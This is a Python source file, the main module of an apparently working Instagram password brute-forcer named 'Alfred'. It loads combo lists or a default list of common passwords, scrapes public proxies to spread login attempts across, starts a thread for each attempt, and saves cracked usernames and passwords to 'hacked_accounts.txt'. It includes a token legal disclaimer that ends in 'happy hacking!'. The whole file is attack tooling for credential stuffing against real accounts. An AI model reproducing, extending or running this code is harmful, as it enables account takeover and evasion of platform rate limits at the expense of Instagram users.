# Instagram bruterforcer main file
from login import *
from misc import *
from threading import Thread, Lock, active_count
from os import getcwd, path, name, system
import os
from time import time, sleep
from colorama import init
from datetime import datetime
import proxyscrape
import subprocess

class Alfred:
    def __init__(self):
        if os.name not in ['posix', 'nt']:
            error("Error: May not run properly on os other than GNU Linux or Windows")
        self.slash = "\\" if os.name == 'nt' else "/"
        self.print_lock = Lock()
        self.combos = []
        self.current_threads = []
        self.run = True
        self.divider = ":"
        self.combolist_path = ""
        self.write_path = str(getcwd()) + self.slash + "hacked_accounts.txt"
        self.verbose = True
        self.ready = False
        self.store_password = True
        self.single_user = None
        self.prompt = False
        self.hacked_count = 0
        self.c = 0
        self.attack_mode = 'combo'
        self.single_pwds = ['password', 'Password1', '1234567890', '12345', 'Password', 'soccer', 'football', 'S@suke', '666666',
                        'dragon', 'P@ssword', "Passw0rd1", '696969', 'Instagr@m1', 'jordan', 'ronaldo', '11111111', 'P@ssword1', 'iloveyou', 'chocolate']
        self.proxy_file = None
        self.proxy_list = []
        self.proxy_location = None
        self.delay_time = 0.5
        self.config_data = read_config()
        self.sleep = lambda: sleep(self.delay_time)

        # Run functions, check user ageement
        init()  # init colorama, for coloured text
        if not self.config_data['agree']:
            error("""          !Notice!
- Alfred must not be used for any unathaurized hacking of instagram accounts
- By using alfred innapropriately you are liable to laws in your specific area, and instagram policies/user agreements/terms and conditions
- I am not to be held liable nor responsible for innapropriate use of Alfred
- To use alfred you must agree to the above terms, which are subject to change""")

            if input('Do you agree to the above terms? (y/n)').lower() in ['yes', 'y', 'ye', 'agress']:
                write_config('agree', True)
                good('[AGREE] You Agreed to the terms, happy hacking!')
                sleep(2)
                clear_screen()
            else:
                error('Error: You Must Agree to the terms to use Alfred!', fatal=True)

    # Reset for another attack
    def reset(self, full=False):
        self.c = 0
        self.current_threads.clear()
        self.hacked_count = 0
        if full:
            self.combos, self.combolist_path = [], ""
            self.proxy_file, self.proxy_list = None, []
            self.single_user = None
        if self.verbose and full:
            print("Reset All Variables!")

    # Print with threading.Lock
    def lprint(self, msg, color=None):
        with self.print_lock:
            if color == "red":
                error(msg)
            elif color == "green":
                good(msg)
            else:
                print(msg)
            
    # read the password files and append to alfred.combos
    def ready_passwords(self):
        if self.attack_mode != 'single' and not path.isfile(self.combolist_path):  # no combolist and not single mode
            error(f"[COMBOLIST] Error, combolist \'{self.combolist_path}\' not found!")
            return

        # Use top defauly wordlist if no passlist
        if self.attack_mode == 'single' and self.combolist_path == "":
            self.set_passwords_default()
            return
        else:
            try:
                with open(self.combolist_path, "rt") as c:
                    data = c.readlines()
                    c.close()
            except FileNotFoundError:
                try:
                    with open(str(__file__).replace("alfred.py", self.combolist_path), "rt") as c:
                        data = c.readlines()
                        c.close()
                except FileNotFoundError:
                    error("Error: Wordlist Not Found, try placing in the Alfred Directory")
                    return
        if self.attack_mode == 'single':
            for line in data:
                if line[0] != "#":
                    self.combos.append([self.single_user, line.strip()])
                    
        elif self.attack_mode == "combo":
            for line in data:
                if line[0] != "#":
                    spl = line.strip().split(self.divider)
                    if len(spl) == 2:
                        self.combos.append([spl[0], spl[1].strip()])
        else:
            error(f'[ATTACK MODE] Error, attack mode \'{self.attack_mode}\' not recognised')

    # Ready The proxy file to be used or download one
    def ready_proxies(self):
        if not self.proxy_file:
            error('[PROXY ERROR] A Proxy File is required!')
            if self.prompt:
                if input('[PROXY] Download Proxies? (y/n)').strip() in ['y', 'ye', 'yes', 'yeah']:
                    self.download_proxies(location=self.proxy_location)
                else:
                    error("Fatal Error: No proxylist!", fatal=True)
            else:
                self.download_proxies(location=self.proxy_location)
        # Parse the proxy file
        with open(self.proxy_file, "rt") as f:
            data = f.readlines()
            f.close()
        for line in data:
            if line[0] != "#":
                self.proxy_list.append(line.strip())

    # Ready Alfred for an attack
    def ready_attack(self):
        if self.verbose:
            print('Readying passwordlist and proxies...')
        if self.combos == []:
            self.ready_passwords()
        self.ready_proxies()
        self.ready = True
        if self.verbose:
            good("[READY] Combos and proxies are ready!")

    # Return a proxy from the list
    def get_proxy(self, attack_no):
        if attack_no <= len(self.proxy_list):
            px = self.proxy_list[attack_no-1]
        else:
            px = self.proxy_list[0]
        return px

    # Download proxies 
    def download_proxies(self, location=False):
        collector = proxyscrape.create_collector('collector1', ['https', 'http']) 
        proxies_raw = ""
        if location:
            collector.apply_filter({"country": location})
        print("[DOWNLOAD] Downloading proxies...", end="")
        for i in range(len(self.combos)):
            a = collector.get_proxy() 
            proxies_raw += str(a[0]) + ":" + str(a[1]) + "\n" 
        print("done")
        if self.verbose:
            print(f"[WRITING] Writing proxies to {getcwd()}{self.slash}proxies.txt...", end="")
        with open("proxies.txt", "w") as pfile:
            pfile.write(proxies_raw)
            pfile.close()
        self.proxy_file = "proxies.txt"
        if self.verbose:
            print("done")

    # Stores credentials in a file
    def write_pwd(self, username, password):
        t = str(datetime.now())[:16]
        with open(self.write_path, "at") as f:
            f.write(f"{t}, {username}:{password}\n")
            f.close()
        if self.verbose:
            print(f'[WROTE] Wrote account credentials to {self.write_path}!')

    # Getting website requests and print the result
    def hack_account(self, user, pwd, num):
        proxy = self.get_proxy(num)
        test = login_check(user.strip(), pwd.strip(), proxy)
        if test == "yes":
            self.lprint(f'[HACKED] {user}:{pwd.strip()} Successful account combo', color="green")
            self.hacked_count += 1
            if self.store_password:
                self.write_pwd(user, pwd)
        elif test == 'invalid_user':
            self.lprint(f"Error: Invalid Username \'{user}\', Please try another username!")
        elif test == 'maybe':
            self.lprint(f'[HACKED] {user}:{pwd} VERIFICATION REQUIRED', color='green')
            self.hacked_count += 1
            if self.store_password:
                self.write_pwd(user, pwd)
        elif test == "wait":
            if self.verbose:
                self.lprint(f"Error: Cannot continue to attack {user}, temporary account login blocked!", color='red')
        else:
            if self.verbose:
                self.lprint(f"[FAIL] failed {user}:{pwd.strip()}! {proxy}", color='red')

    # Set the wordlist to the top 20 passwords
    def set_passwords_default(self):
        self.combos.clear()
        for pwd in self.single_pwds:
            self.combos.append([self.single_user, pwd])
        if self.verbose:
            good(f'[PASSLIST] Set passwordlist to defualt top {len(self.single_pwds)}!')
        
    # Main attack function
    def attack(self):
        start, incremental_print_time = time(), time()
        print(f'Starting {len(self.combos)} password attack threads...')
        # make a thread for each password
        for username, password in self.combos:
            if not self.run:
                break
            t = Thread(target=self.hack_account, args=[username, password, self.c], daemon=False)
            t.start()
            self.current_threads.append(t)
            self.c += 1
            if self.delay_time > 0:
                self.sleep()

        # Wait for threads to die and print info after every 20 seconds
        while active_count() > 1:
            try:
                if time() > incremental_print_time + 15:
                    print(f'[STATS] Total Attempts: {self.c}     Hacked: {self.hacked_count}      Elapsed: {round(time() - start, 2)}s') 
                    incremental_print_time += 20
                    
            except KeyboardInterrupt:
                for th in self.current_threads:
                    t.run = False
                error("Keyboard Interrupt; Exiting...", fatal=True)
            
        print("[DONE] All Passwords have been attempted!")
        el = round(time() - start, 2)
        print(f"[STATS] Elapsed: {el} seconds")
        print(f"[STATS] Total Attempts: {self.c}")
        if self.hacked_count == 0:
            error("[FAIL] No accounts hacked!")
        else:
            good(f'[HACKED] Hacked a total of {self.hacked_count} account(s)!')
        self.reset()

    # Start the attack with whatever function
    def go(self):
        self.run = True
        if self.attack_mode == 'combo':
            if not self.ready:
                print("[READYING] Getting Alfred Ready...")
                self.ready_attack()
            print('[ATTACK STARTING] Starting combo mode attack')
            self.attack()
        elif self.attack_mode == 'single':
            if not self.ready:
                self.ready_attack()
            if self.combolist_path == "":
                self.set_passwords_default()
                if not self.proxy_file:
                    self.ready_proxies() 
            self.attack()
        else:
            print('Invalid Attack Mode!')
